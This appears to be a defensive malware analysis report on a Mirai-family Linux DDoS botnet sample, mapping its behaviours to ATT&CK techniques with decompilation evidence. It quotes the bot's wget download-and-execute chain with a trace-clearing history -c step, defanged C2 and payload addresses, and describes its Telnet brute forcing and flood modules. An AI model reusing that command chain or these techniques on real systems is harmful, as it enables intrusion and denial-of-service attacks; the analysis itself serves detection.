> [!WARNING]
> **Verdict: malicious** · Family **Mirai** · Confidence **high**
> 
> Aliases: Mirai.PX, px_botnet, Linux.Mirai
> 
> The sample is an x86_64 ELF with a complete symbol table. Decompilation directly shows that it deletes itself on startup and masquerades its process name/argv[0] as bash, then forks and calls setsid to stay resident in the background; it reads /etc/machine-id to build a Bot ID, periodically polls a hardcoded C2 over HTTP and parses commands, then dispatches 11 DDoS flooding modules including OVHL7, PPS, HTTP, UDPRAW, HOLD, JUNK, RANDHEX, STD, UDP, TCP and XTDCUSTOM; it also embeds a Telnet weak-password scanner and a wget download-and-execute chain. All of the above can be verified in function-level decompilation and string/byte evidence; the sample is judged a malicious DDoS botnet program with high confidence.

## Behavior analysis

**11** behaviors in total, each with attached evidence, and all are statically obtainable.

### 1. Self-deletes and masquerades as bash

`T1036.005` · Confidence **high** · Static

After startup it calls remove(argv[0]) to delete its own file, rewrites argv[0] to bash, and masquerades the process name as bash via prctl(PR_SET_NAME,"bash").

> **Evidence**: main (rva 0xE640): remove(*param_2); *(int*)argv[0]=0x68736162; argv[0]=0x115063("bash"); prctl(0xF,"bash")
> 
> **Source**: `ev-000003`

### 2. Double fork detaches from terminal

`T1564` · Confidence **high** · Static

It forks twice; the parent calls waitpid and then exits, while the child calls setsid, chdir("/") and ignores SIGCHLD, becoming a background resident.

> **Evidence**: main (rva 0xE640): fork→waitpid/exit; fork→setsid; chdir("/"); signal(0xD,1)
> 
> **Source**: `ev-000003`

### 3. Reads machine-id to build Bot ID

`T1082` · Confidence **high** · Static

It reads /etc/machine-id as the bot identifier; on read failure it falls back to random_id-<rand>, and the main flow then appends -<rand%100000>.

> **Evidence**: ft_get_id (rva 0xF430): fopen("/etc/machine-id"); on failure ft_strnjoinf("random_id-",…,n)
> 
> **Source**: `ev-000005` · `ev-000001`

### 4. Polls C2 for commands

`T1071.001` · Confidence **high** · Static

Periodically it pulls commands with HTTP/1.1 GET hxxp://83[.]147[.]242[.]137:80/api.php?id=<BotID>&arch=x86_64, sleeping rand%10 seconds between requests.

> **Evidence**: main (rva 0xE640): ft_request→ft_manage_request loop; http_request (rva 0xF870): "GET %s %s\r\nHost: %s"; http_create_socket (rva 0xF800): sockaddr port bytes 0x00 0x50
> 
> **Source**: `ev-000003` · `ev-000009` · `ev-000010` · `ev-000007` · `ev-000014`

### 5. Parses api command frames

`T1071.001` · Confidence **high** · Static

It locates the "api-" prefix in the HTTP response and cuts out the command string up to the following "-api"; it then splits on '|' into command name and arguments.

> **Evidence**: ft_request (rva 0xF630) scans 'a','p','i','-' and strdups the following content; ft_manage_request (rva 0xE980) separates fields with 0x7C ('|')
> 
> **Source**: `ev-000006` · `ev-000004`

### 6. KILL token self-destruct

`T1489` · Confidence **high** · Static

On receiving KILL|ADFVDJIUCJHEhguehdFUCDJuyhy it does not enter attack dispatch but executes exit(0), letting the operator terminate the bot remotely.

> **Evidence**: ft_manage_request (rva 0xE980): two-field check of "KILL" and the 27-byte magic (off 0x15004/0x1500D); only on mismatch does it fork and dispatch an attack, while a match falls through to exit(0)
> 
> **Source**: `ev-000004` · `ev-000001` · `ev-000014`

### 7. Multi-protocol DDoS flooding

`T1498.001` · Confidence **high** · Static

Following C2 commands it invokes modules such as OVHL7, PPS, HTTP, UDPRAW, HOLD, JUNK, RANDHEX, STD, UDP, TCP and XTDCUSTOM, launching time-limited traffic or connection floods against the target IP/port.

> **Evidence**: ft_manage_request (rva 0xE980) dispatch table strncmp "OVHL7"/"PPS"/"HTTP"/"UDPRAW"/"HOLD"/"JUNK"/"RANDHEX"/"STD"/"UDP"/"TCP"/"XTDCUSTOM"; PPS (rva 0x13050) socket_connect+write loop
> 
> **Source**: `ev-000004` · `ev-000013`

### 8. Telnet weak-password brute force

`T1110.001` · Confidence **high** · Static

It scans 23/TCP on random public IPs, reads the login:/password: prompts, then tries combinations of 8 built-in usernames and 17 passwords; on success it sends a download command.

> **Evidence**: ft_scan_world (rva 0x12500): sockaddr port sa_data[1]=0x17(23); usernames@rva 0x482E0 / passwords@rva 0x48240; readUntil("ogin:")/"assword:"; matchPrompt
> 
> **Source**: `ev-000011` · `ev-000008` · `ev-000014`

### 9. Downloads and executes wget script

`T1105` · Confidence **high** · Static

After a successful brute force it tries cd /tmp, /var/system, /mnt, /root, / in turn, runs wget -O wget.sh hxxp://91[.]186[.]209[.]228/re.sh, chmod +x, sh wget.sh, rm wget.sh and history -c, to deliver the follow-up payload and clean up traces.

> **Evidence**: command strings embedded in ft_scan_world (rva 0x12500); download URL at rodata off 0x4156C = 91.186.209[.]228/re.sh; execution chain includes chmod +x, sh wget.sh, rm wget.sh, history -c
> 
> **Source**: `ev-000011` · `ev-000014`

### 10. Random public IP scanning

`T1046` · Confidence **high** · Static

It uses a custom PRNG to generate random public IPv4 addresses, excluding private or reserved ranges such as 0/10/172/192.168/127/169.254 before using them as scan targets.

> **Evidence**: ft_generate_ip (rva 0xF160): rand%0xDE generates the first byte and filters 0/0xAC/0xC0; the second byte filters 0x10–0x1F/0xA8; getRandomPublicIP (rva 0x122B0)
> 
> **Source**: `ev-000008`

### 11. Fake UA pool

`T1036` · Confidence **medium** · Static

It embeds a large number of browser and crawler User-Agent strings, randomly chosen during HTTP requests/flooding to obfuscate traffic characteristics.

> **Evidence**: .data useragents @rva 0x44020 (symbol size 14640); the string area contains Chrome/Opera/Firefox/Baiduspider UAs
> 
> **Source**: `ev-000001` · `call:call_24b4f26e0557469288691139`

## Common misjudgments

:::important
The following conclusions **are easy to misjudge**; please take care when citing this report.

- It is not ransomware or a file encryptor: the only 0x9E3779B9 constant belongs to the CMWC PRNG seed of init_rand (off 0xFDFE), and no file traversal, encryption or ransom-note logic was found.
- It is not Windows malware and has no systemd/cron/rc local persistence: it is an x86_64 ELF that self-deletes on startup and relies mainly on C2 polling to keep running.
- Do not treat the 8.8.8[.]8 in main as C2: that value is only written to a global addr and no later use was seen; the actual HTTP target is 83[.]147[.]242[.]137 decoded by init_randomizer.
- No real C2 session or issued command was obtained: both the C2 and the stage-two download address were recovered statically, so it cannot be claimed that successful callout, command delivery or data exfiltration was observed.
- Beyond Telnet weak-password brute forcing and download-and-execute, no evidence of credential theft, lateral movement or local data collection was found.
:::

**Limitations and pending verification**

1. Repeated isolated dynamic execution attempts all returned executor errors (guest_rc=0); no process, network or memory runtime events were obtained, reproduced=false.
2. The C2 and stage-two download addresses were recovered only via static decompilation and string decoding; recoverability=static and pending_dynamic_verify=true.
3. The attack commands actually issued by the C2 or the re.sh payload could not be obtained; the attack parameter format is inferred only from the command dispatch table.
4. The purpose of 8.8.8[.]8 cannot be confirmed from this sample (it is only assigned to a global variable), so it is not listed as C2.
5. No real network connections were made, and the sample was not executed on a host environment.
